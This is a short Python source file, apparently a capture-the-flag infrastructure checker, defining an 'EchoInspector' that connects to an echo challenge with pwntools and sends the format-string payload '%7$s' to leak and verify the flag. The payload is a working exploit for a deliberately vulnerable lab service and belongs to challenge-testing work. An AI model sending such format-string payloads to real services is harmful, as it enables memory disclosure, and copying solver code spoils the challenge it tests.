from pwn import *

from inspectors.pwn import PwnChallengeInspector


class EchoInspector(PwnChallengeInspector):

    def solve(self) -> bool:
        context.log_level = 'CRITICAL'

        io = remote(self.host, self.port)
        try:
            io.sendthen(data='%7$s\n', delim='')
            res = io.recvline().strip().decode()

            assert self.flag in res

            self.logger.warning(self.msg_succeeded_to_solve())
            return True

        except:
            self.logger.info(self.msg_failed_to_solve())
            return False

        finally:
            io.close()
